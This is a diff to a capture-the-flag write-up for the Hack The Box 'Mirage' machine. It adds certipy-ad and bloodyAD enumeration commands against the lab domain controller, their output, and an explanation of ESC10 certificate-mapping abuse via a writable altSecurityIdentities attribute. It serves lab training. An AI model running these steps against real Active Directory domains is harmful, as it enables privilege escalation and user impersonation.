@@ -599,6 +599,70 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 
 # ESC10 exploit:
+I have tried to  use `certipy-ad` to find the vulnerable exploit here.
+```
+certipy-ad find \
+  -u 'mark.bbond@mirage.htb' \
+  -k -no-pass \
+  -dc-ip 10.10.11.78 \
+  -target dc01.mirage.htb \
+  -vulnerable
+```
+But nothing vulnerable is listed from that.
+
+Let's continue to check the writable `ACL` attributes lists
+```
+┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
+└─$ bloodyAD --host dc01.mirage.htb --dc-ip 10.10.11.78 -d mirage.htb -k get writable --otype USER --right WRITE --detail                            
+
+distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
+manager: WRITE
+mail: WRITE
+msDS-HABSeniorityIndex: WRITE
+msDS-PhoneticDisplayName: WRITE
+msDS-PhoneticCompanyName: WRITE
+msDS-PhoneticDepartment: WRITE
+msDS-PhoneticLastName: WRITE
+msDS-PhoneticFirstName: WRITE
+msDS-SourceObjectDN: WRITE
+msDS-AllowedToDelegateTo: WRITE
+altSecurityIdentities: WRITE
+servicePrincipalName: WRITE
+userPrincipalName: WRITE
+legacyExchangeDN: WRITE
+otherMailbox: WRITE
+showInAddressBook: WRITE
+systemFlags: WRITE
+division: WRITE
+objectGUID: WRITE
+name: WRITE
+displayNamePrintable: WRITE
+proxyAddresses: WRITE
+company: WRITE
+department: WRITE
+co: WRITE
+dn: WRITE
+initials: WRITE
+givenName: WRITE
+description: WRITE
+title: WRITE
+ou: WRITE
+o: WRITE
+sn: WRITE
+objectCategory: WRITE
+cn: WRITE
+objectClass: WRITE
+```
+We can found some hints about `ESC10` abuse
+```
+altSecurityIdentities: WRITE
+This is the core condition of ESC10 abuse.
+
+ESC10 in brief:
+If an attacker has write permission to the altSecurityIdentities attribute of a user object, he can inject arbitrary certificate mapping information (such as: X509:<I>CN=CA...<S>CN=SomeUser) into the attribute, allowing the attacker to use a forged client certificate to impersonate the user for Kerberos PKINIT authentication.
+```
+
+Then let's check the detail of exploit:
 `https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc10-weak-certificate-mapping-for-schannel-authentication`
 Please follow this link to exploit step by step
 **Check the `ESC10 case1 or case2`**
@@ -615,7 +679,7 @@ HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\H
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\KeyExchangeAlgorithms
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protocols
 ```
-Look for ESC10 after Mirage-Service$ because the service account had permissions to modify event subscriptions, enabling privilege escalation via Event Subscription abuse.
+Look for `ESC10` after `Mirage-Service$` because the service account had permissions to modify event subscriptions, enabling privilege escalation via Event Subscription abuse.
 ![](images/Pasted%20image%2020250720181332.png)
 
 **Step 1: UPN Manipulation**
